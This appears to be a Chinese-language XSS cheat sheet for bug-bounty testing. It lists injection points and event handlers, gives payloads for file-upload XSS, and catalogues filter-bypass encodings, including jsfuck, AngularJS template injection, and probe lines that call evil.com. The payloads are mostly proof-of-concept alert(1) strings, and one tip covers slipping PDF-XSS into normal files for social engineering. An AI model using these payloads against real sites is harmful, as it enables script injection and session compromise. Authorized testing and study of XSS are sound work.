Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application.

> 只可作用于触发 XSS 的网站, 如: 
>
> 在 example.com 上传 `xss.svg`, 打开时会调用 test.com 提供的 HTML 解析器并触发 XSS;
>
> 那么此时的 XSS 只作用于 test.com, 不会影响 example.com.

Reflected 和 DOM 时常不收, 留意公告

## 1. Principle

搜索 test 时, 服务器会将我输入的字符处理后返回到浏览器

```
GET /?search=test HTTP/2
Host: example.com
```

```
<input value="test" type="text">
```

若搜索的内容是一段 Payload, 如： `"onclick=alert(1)"` 那么就会在浏览器注入 XSS

```
<input value=""onclick=alert(1)"" type="text">
```

### 1.1. Location

- 输入框
- URL

- 文件上传处

- 任何可控参数

  ```
  GET /?search=test HTTP/2
  Host: example.com
  Referer: https://xss.example.com
  ```

  ```
  <input value="https://xss.example.com" type="text">
  ```

  > 响应包中 `value` 的值由请求包中的 `Referer` 的值控制, 那么可能存在 XSS

### 1.2. 常用执行函数

| 弹窗验证   | 控制台验证       |
| ---------- | ---------------- |
| alert(1)   | console.log(1)   |
| confirm(1) | console.info(1)  |
| prompt(1)  | console.error(1) |
| alert(1)   | console.warn(1)  |

若无法弹窗验证或者控制台验证可以尝试组合 CSRF 使用

```
<img/src/onerror=fetch("http://example.com")>
```

### 1.4. 常用触发事件

加载事件

```
onload=alert(1)	         # 元素加载完成时触发
onerror=alert(1)         # 元素加载失败时触发
```

鼠标事件

```
onclick=alert(1)	     # 点击元素时触发
ondblclick=alert(1)      # 双击元素时触发
oncontextmenu=alert(1)   # 右击元素时触发
onmousemove=alert(1)	 # 鼠标移动到元素上方时触发
onmouseover=alert(1)	 # 鼠标悬停在元素上方时触发
onmousedown=alert(1)	 # 鼠标按下时触发
onmouseup=alert(1)	     # 鼠标松开时触发
onmouseenter=alert(1)    # 鼠标进入元素时触发
onmouseleave=alert(1)    # 鼠标离开元素时触发
```

表单事件

```
onfocus=alert(1)        # 元素获得焦点
onblur=alert(1)         # 元素失去焦点
oninput=alert(1)        # 用户输入时触发
onselect=alert(1)       # 用户选中文本时触发
onsubmit=alert(1)       # 表单提交时触发
onreset=alert(1)        # 表单重置时触发
onchange=alert(1)       # 输入框, 下拉框等内容变更后失焦
```

键盘事件

```
onkeydown=alert(1)      # 按键按下
onkeypress=alert(1)     # 按键按下并产生字符
onkeyup=alert(1)        # 按键释放
```

## 2. 数据提交类

在目标网站提交使用 XSS 构造的数据.

### 2.1. 测试步骤

### 2.1.1. 查找注入点

- 输入框
- URL
- 文件上传处
- 任何可控参数

注入一段随机字符串, 若可在源码或响应包中找到这段字符串, 则可能存在 XSS

### 2.1.2. Harmless

> 在 Burp 中测试 GET 请求时需要对空格进行 URL 编码, 若成功解析则响应中的标签是彩色的

使用无危害标签测试是否可以解析, 若可以解析则存在 HTML Injection, 可进一步测试 XSS

```
<s>1
%3Cs%3E1
'"><s>1
%27%22%3E%3Cs%3E1
'"><s>1#//--+
%27%22%3E%3Cs%3E1%23%2F%2F--%2B
'"></xmp></title></style></iframe></script></noembed></noscript></textarea><s>1#//--+
%27%22%3E%3C%2Fxmp%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Fiframe%3E%3C%2Fscript%3E%3C%2Fnoembed%3E%3C%2Fnoscript%3E%3C%2Ftextarea%3E%3Cs%3E1%23%2F%2F--%2B
```

某些标签的内容无法解析,需要闭合

```
</xmp>
</title>
</style>
</iframe>
</script>
</noembed>
</noscript>
</textarea>
```

提交这个字符串可以判断过滤了哪些字符

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1);//'>
```

经典 Payload

```
<img/src/onerror=alert(1)>
```

使用 OOB 测试 Blind XSS

```
<img/src=https://evil.com>
```

## 3. 文件解析类

在文件中嵌入恶意脚本后上传, 当目标加载文件时会触发 XSS 攻击.

常见的文件解析类 XSS 有 PDF-XSS, PNG-XSS, SVG-XSS, HTML-XSS, XML-XSS

> 触发 PDF-XSS 需要 PDF 查看器中可执行嵌入的 JavaScript, 如: Chromium
>
> 访问 PDF-XSS 链接时的请求参数不能随意删除, 否则无法触发
>
> 社工时可以使用 [iLovePDF](https://www.ilovepdf.com/zh-cn/merge_pdf) 将正常 PDF 与 PDF-XSS 合并
>
> 由于 PDF-XSS 只能弹窗, SRC 一般不收,要留意公告

> 触发 PNG-XSS 需要目标可解析 EXIF, 如: [Online EXIF Viewer](https://onlineexifviewer.com/)

若目标仅在前端校验可上传一张 PNG 文件，然后在 Burp Suite 中修改为 HTML

```http
Content-Disposition: form-data; name="uploaded"; filename="XSS.png"

 PNG
```

```http
Content-Disposition: form-data; name="uploaded"; filename="XSS.html"

 PNG
<img/src/onerror=alert(1)>
```

从 Burp Suite 中查找关键词 XSS.html 得到路径后访问 URL 即可触发 XSS

```
../../hackable/uploads/XSS.html succesfully uploaded!
```

```
http://debian.local/dvwa/hackable/uploads/XSS.html
```

某些情况下文件上传处是通过编码上传的, 可以通过修改文件类型及文件编码嵌入 XSS

```
data:image/png;base64,VGhpcyBpcyBhIHRlc3QgZmllbGQ=
```

```
data:text/html;base64,PGltZy9zcmMvb25lcnJvcj1hbGVydCgxKT4=
```

- [pdfsvgxsspayload](https://github.com/ynsmroztas/pdfsvgxsspayload)

## 4. Bypass

引号闭合插入事件绕过

```
" onclick=alert(1)
```

```
" autofocus onfocus=alert(1) x="
```

尖括号闭合插入标签绕过

```
"><img/src/onerror=alert(1)>
```

`href` 伪协议绕过

```
<a href=javascript:alert(1)>1</a>
```

双写绕过

```
<a href=javascjavascriptript:alert(1)>1</a>
```

大小写绕过

```
<a href=jaVaScRipT:alert(1)>1</a>
```

URL 编码绕过

```
%27%22%3E%20%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E
```

添加 HTML 编码后的 Tab 绕过

```
%22%3E%20%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E
```

## 5. 特殊情况

### 5.1. hidden

某些注入点可能被 `hidden` 隐藏

```
<input vule="payload" type="hidden">
```

修改为 `text` 即可

```
<input vule="payload" type="text">
```

### 5.2. ng-include

`ng-include` 可引入一个 URL 

```
<body><span class="ng-include:payload"></span></body>
```

若引入的 URL 存在 XSS 则可能对在当前网站生效

```
<body><span class="ng-include:'https://evil.com/xss.php?payload=<img/src/onerror=alert(1)>'"></span></body>
```

默认情况下 ng-include 只能引入当前网站的 URL

```
<body><span class="ng-include:'/xss.php?payload=<img/src/onerror=alert(1)>'"></span></body>
```

### 5.3.ng-app

被 `ng-app` 包裹的的指令, 可以尝试 `{{}}` 

```
{{constructor.constructor('alert(1)')()}}
```

相当于

```
Function('alert(1)')()
```

## 6. 编码

分隔符绕过，某些分隔符会让后面的字符串变成新的属性，例如：`<input type="text" name="p1" value="xss"> ,:;onmousemove="alert(1)"` ，生成了 `onmousemove=""` 属性

```
xss"> ,:;onmousemove=alert(1)
```

atob 解 Base64 编码绕过

```
<script>eval(atob("YWxlcnQoMSk="))</script>
```

尖括号的十六进制编码绕过

```
\\x3cscript\\x3ealert(1)\\x3c/script\\x3e
```

**js 中的编码 `<script></script>` 解码后执行**

ASCII

```
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

Base64

```
eval(atob("YWxlcnQoMSk="))
```

**无需解码直接执行**

hex

```
eval("\x61\x6c\x65\x72\x74\x28\x31\x29")
```

unicode

```
\u0061\u006c\u0065\u0072\u0074\u0028\u006e\u0075\u006c\u006c\u0029
```

jsfuck

```
[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[+!+[]]]+[+!+[]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]])
```

```
在 jsfuck 中 eval        =>  []["filter"]["constructor"]( CODE )()
```

伪协议绕过(空格可以用 / 代替)

```
<img/src/onerror=location="javascript:alert(1)">
```

**目标执行顺序**

```
1.浏览器解析 HTML 标签	自动解码 HTML 的值	location="javascript:alert(1)" 为 onerror 属性的值
2.浏览器解析 location 中的 url	自动解码 URL 编码 alert(1)
3.浏览器识别 javascript 伪协议	自动解码 js 编码 alert(1)	（括号和括号内的不能编两次）

黑客编码顺序反过来321

编码过程:JS编码→伪协议URL编码→HTML编码→（URL编码传输给服务器→服务器解码URL），（）中的为浏览器向目标传输数据的编码，无需操作

解码过程:解码HTML编码→伪协议解码URL编码→JS解释器自动解码JS编码→执行
```

1.对 alert(1) 进行 unicode 编码（有的时候也可以直接对 () 进行编码，hex 不可以）

```
<input onfocus="location='javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'">
```

2.对 alert 的 unicode 编码进行 url 编码 （括号和括号里的值不能编两次，也可以不进行 unicode 编码而进行 url 编码，二者只能选择其一）

```
<input onfocus="location='javascript:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%5Cu0028%5Cu0031%5Cu0029'">
```

3.对 alert(1) 进行 unicode 编码后对 location="javascript:alert(1)" 再进行 html 编码

```
<input onfocus=location="javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029"
```

字符串切割

```
<input onfocus=location="j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+1+")">
```

注释绕过（`/*注释*/`）

```
<input onfocus=location="java&#09;sc"+/**/"ript:\u0061\u006c\u0065\u0072\u0074\u0028\u006e\u0075\u006c\u006c\u0029" autofocus>
```

注释加入到分割

```
<input onfocus=location="j"+"a"+/**/"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+ "n"+"u"+"l"+"l"+")">
```

svg 可以自动解析 js 标签中的 html 编码

```
<svg><script>&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>
```

1 char

```
<\0s>1
<\x00s>1
<\u0000s>1
```

### IE

IE 浏览器 input 标签 style 属性伪协议绕过

```
style="background-image:url(javascript:alert(1))"
```

IE 浏览器的 expression 绕过

```
hello:expression(alert(1))
```

CSS 层叠样式表注释会替换为空

```
hello:expr/**/ession(alert(1))
```

---

**References**

- [Cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)
- [CWE-79](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-79)
- [The return of the ＜](https://hackerone.com/reports/639684)
- [Stored XSS in Wiki pages](https://hackerone.com/reports/526325)
- [Stored XSS on imgur profile](https://hackerone.com/reports/484434)
- [尖括号被过滤无法闭合?有没有尝试过用表情符号触发的XSS？](https://mp.weixin.qq.com/s/lF53d_DHEnYhch_H3R82DQ)
- [xss bypass备忘单|xss绕过防火墙技巧|xss绕过WAF的方法](https://www.ddosi.org/xss-bypass/)
- [DiscuzX2个人空间图片EXIF信息XSS](https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2012-07468)

